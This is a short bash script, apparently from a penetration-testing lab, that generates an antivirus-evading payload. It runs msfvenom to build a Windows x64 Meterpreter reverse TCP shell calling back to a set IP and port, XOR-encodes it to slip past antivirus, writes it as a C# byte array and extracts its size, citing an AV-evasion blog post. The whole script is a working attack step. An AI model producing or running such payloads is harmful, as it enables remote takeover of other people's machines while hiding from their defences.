#!/bin/bash


# Reference: https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html



IP="10.10.14.19"
PORT="8550"


cd ~/transfer-stage
mkdir avbypass
cd avbypass



file="5-payload_csharp"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} \
    -e x64/xor_dynamic \
    -f csharp > "${file}"

# or use encoder x64/zutto_dekiru if it works


size=$(cat "${file}" | grep "new byte[" | cut -d '[' -f3)

